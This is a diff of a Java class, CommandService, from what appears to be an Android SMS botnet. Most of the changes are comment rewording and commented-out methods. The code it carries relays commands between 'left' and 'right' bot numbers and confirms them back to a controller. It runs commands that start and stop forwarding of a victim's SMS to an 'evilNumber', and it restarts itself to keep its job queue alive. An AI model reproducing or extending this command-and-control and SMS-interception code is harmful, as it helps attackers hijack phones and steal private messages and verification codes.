@@ -84,7 +84,7 @@ public class CommandService extends Service {
 	}	
 	
 	public void onCreate() {
-		//just in case
+		/* set the service lock to avoid side effect */
 		CommonVariable.CommandServiceLock = "true";
 		Debug.PrintLog("CommandService","CommandServiceLock set "+CommonVariable.CommandServiceLock);		
 		
@@ -94,22 +94,21 @@ public class CommandService extends Service {
 	//what if there is no network ability and in a GSM network??
 	
 	public boolean GetMyPhoneNumber(String sender) {
-		// for emulator
-/*
-		TelephonyManager tMgr =(TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
-		CommonVariable.selfNumber = tMgr.getLine1Number().equals("")? CommonVariable.selfNumber : tMgr.getLine1Number() ;
-		PrintLog("my phone number is:"+CommonVariable.selfNumber);
-*/
+		/* this method will not work in GSM sim cards */
+		//TelephonyManager tMgr =(TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+		//CommonVariable.selfNumber = tMgr.getLine1Number().equals("")? CommonVariable.selfNumber : tMgr.getLine1Number() ;
+		//PrintLog("my phone number is:"+CommonVariable.selfNumber);
+		 
 				
-		// for GSM
+		/* Instead we use the following approach */
 		if ( CommonVariable.selfNumber.equals("") ) {	
-			// check left
+			/* check left */
 			if ( !CommonVariable.leftBotNumber.equals("") && CommonVariable.isSendLeftBotToQueryNumber.equals("false") ) {
 				String SMSContent = CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.leftBotNumber+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER; 
 				SendSMS(sender,CommonVariable.leftBotNumber,SMSContent,CommonVariable.PHONE_NUMBER_RESPONSE,null,true);
 				CommonVariable.isSendLeftBotToQueryNumber = "true";
 			}
-			// check right
+			/* check right */
 			else if ( !CommonVariable.rightBotNumber.equals("") && CommonVariable.isSendRightBotToQueryNumber.equals("false") ) {
 				String SMSContent = CommonVariable.COMMAND_SIGN+CommonVariable.SEPERATE+CommonVariable.rightBotNumber+CommonVariable.SEPERATE+CommonVariable.SENDBACK_PHONE_NUMBER;
 				SendSMS(sender,CommonVariable.rightBotNumber,SMSContent,CommonVariable.PHONE_NUMBER_RESPONSE,null,true);
@@ -119,11 +118,13 @@ public class CommandService extends Service {
 		}
 		return true;
 	}
-	
+	/* check the job queue when destroy */
 	public void onDestroy() {
+		/* if there are still job inside, restrart it */
 		if(!CommandJob.isEmpty()) {
 			Debug.PrintLog("CommandService", "still job in job queue");			
 			CommandJob.stillJob = true;
+			/* broadcast the restart signal */
 			sendBroadcast(new Intent().setAction
 					("CommandService.stillJob"));
 		}
@@ -139,21 +140,20 @@ public class CommandService extends Service {
 	
 	@Override
 	public int onStartCommand(Intent intent, int flags, int startId) {	 		
-		CommandJobElement job;
+		CommandJobElement job;		
+		/* Try to get my phone number */
 		
-		// Try to get my phone number
-		/*
-		if ( CommonVariable.selfNumber.equals("") ) {
-			GetMyPhoneNumber();
-		}
-		*/
+		//if ( CommonVariable.selfNumber.equals("") ) {
+		//	GetMyPhoneNumber();
+		//}
 		
+		/* this situation should never happened */
 		if(CommandJob.isEmpty()){
 			Debug.PrintLog("CommandService", "nothing in the job queue, why I'm awake....:P");
 			this.stopSelf();
 		}
 		
-		//if there are multi command in the job queue, execute all
+		/* if there are multi command in the job queue, execute all */
 		else {
 			while(!CommandJob.isEmpty()) {
 				job = CommandJob.getJob();
@@ -187,7 +187,7 @@ public class CommandService extends Service {
 				}
 			}
 			else if ( cmd[2].contains(CommonVariable.SET_LEFT_BOT) ) {
-				// inform sender for receiving message success
+				/* inform sender for receiving message success */
 				try {
 					SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
 				}catch ( Exception e ) {
@@ -217,7 +217,7 @@ public class CommandService extends Service {
 			}
 			else if ( cmd[2].contains(CommonVariable.SET_RIGHT_BOT) ) {
 				if ( isForMe ) {
-					// inform sender for receiving message success
+					/* inform sender for receiving message success */
 					try {
 						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[5],false);
 					}catch ( Exception e ) {
@@ -251,7 +251,7 @@ public class CommandService extends Service {
 			}
 			else if ( cmd[2].contains(CommonVariable.START_FORWARD_SMS) ) {
 				if ( isForMe ) {
-					// inform sender for receiving message success
+					/* inform sender for receiving message success */
 					try {
 						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[4],false);
 					}catch(Exception e) {
@@ -274,7 +274,7 @@ public class CommandService extends Service {
 			}
 			else if ( cmd[2].contains(CommonVariable.STOP_FORWARD_SMS) ) {
 				if ( isForMe ) {
-					// inform sender for receiving message success
+					/* inform sender for receiving message success */
 					try {
 						SendSMS(sender,sender,CommonVariable.RESPONSE_SIGN+CommonVariable.SEPERATE+CommonVariable.HAVE_RECEIVED,null,cmd[3],false);
 					}catch ( Exception e ) {
@@ -459,50 +459,50 @@ public class CommandService extends Service {
 			return true;
 		}
 		else if (cmd[0].contains(CommonVariable.RESPONSE_SIGN)) {
-			Debug.PrintLog("CommandService","I am in Command mode, but I receive a RESPONSE signal?");
-			//PrintToast("I am in Command mode, but I receive a RESPONSE signal?",this);
+			Debug.PrintLog("CommandService","I am in Command mode, but I receive a RESPONSE signal?");			
 			return true;
 		}
-		// there is not command
+		/* there is no command */
 		else {
 			return false;
 		}
 	}
 	
 	private boolean forwardToNext( String sender, String commandTemp , String oldTime ) {
-		// to right
+		/* to right */
 		if ( sender.equals(CommonVariable.leftBotNumber) && !CommonVariable.rightBotNumber.equals("") ) {
-			// forward to next
+			/* forward to next */
 			SendSMS(sender,CommonVariable.rightBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
 			Debug.PrintLog("CommandService","Forward to right Bot successfully and the number is "+CommonVariable.rightBotNumber);
 		}
-		// to left
+		/* to left */
 		else if ( sender.equals(CommonVariable.rightBotNumber) && !CommonVariable.leftBotNumber.equals("") ) {
-			// forward to next
+			/* forward to next */
 			SendSMS(sender,CommonVariable.leftBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
 			Debug.PrintLog("CommandService","Forward to left Bot successfully and the number is "+CommonVariable.leftBotNumber);
 		}
-		// neither
+		/* neither */
 		else {
 			/* if another hacker(not bot master) send command to you directly? */
+			/* what if he is in the botnet */
 			Debug.PrintLog("CommandService", "Not from left or right. Default: pass to left");
 			SendSMS(sender,CommonVariable.leftBotNumber,commandTemp,CommonVariable.HAVE_RECEIVED,oldTime,true);
 			Debug.PrintLog("CommandService","Forward to left Bot successfully and the number is "+CommonVariable.leftBotNumber);
 		}
 		return true;
 	}
-	
-	private boolean checkScreenIsOn() {
-		PowerManager pm = (PowerManager) getSystemService(CommandService.POWER_SERVICE);
-		if ( !pm.isScreenOn() ) {
-			Debug.PrintLog("CommandService","Screen is off....");
-			return false;
-		}
-		else {
-			Debug.PrintLog("CommandService","Screen is on....");
-			return true;
-		}
-	}
+	/* we use the receiver way to check the screen state. The method is useless, just to remind me there is another approach */
+	//private boolean checkScreenIsOn() {
+	//	PowerManager pm = (PowerManager) getSystemService(CommandService.POWER_SERVICE);
+	//	if ( !pm.isScreenOn() ) {
+	//		Debug.PrintLog("CommandService","Screen is off....");
+	//		return false;
+	//	}
+	//	else {
+	//		Debug.PrintLog("CommandService","Screen is on....");
+	//		return true;
+	//	}
+	//}
 	private void startFoward(String evilNumber) {
 		if ( CommonVariable.ForwardServiceLock.equals("false") ) {
 			Intent foward = new Intent(this, FowardService.class);
@@ -535,13 +535,13 @@ public class CommandService extends Service {
 	}
 	
 	private boolean SendSMS ( String sender, String destNumber, String message, String state, String receivedTime, boolean isToWaitResponse ) {
-        // wait others send back
+        /* wait others send back */
         if ( isToWaitResponse == true ) {
         	String time = ResponseTable.addJob(destNumber, message, state, receivedTime);
         	SmsManager smsManager = SmsManager.getDefault();  
             smsManager.sendTextMessage(destNumber, null, message+CommonVariable.SEPERATE+time, null, null);
         }
-        // return back
+        /* return back */
         else {
         	if ( !sender.equals("0000") ) {
 	        	if ( receivedTime == null ) {
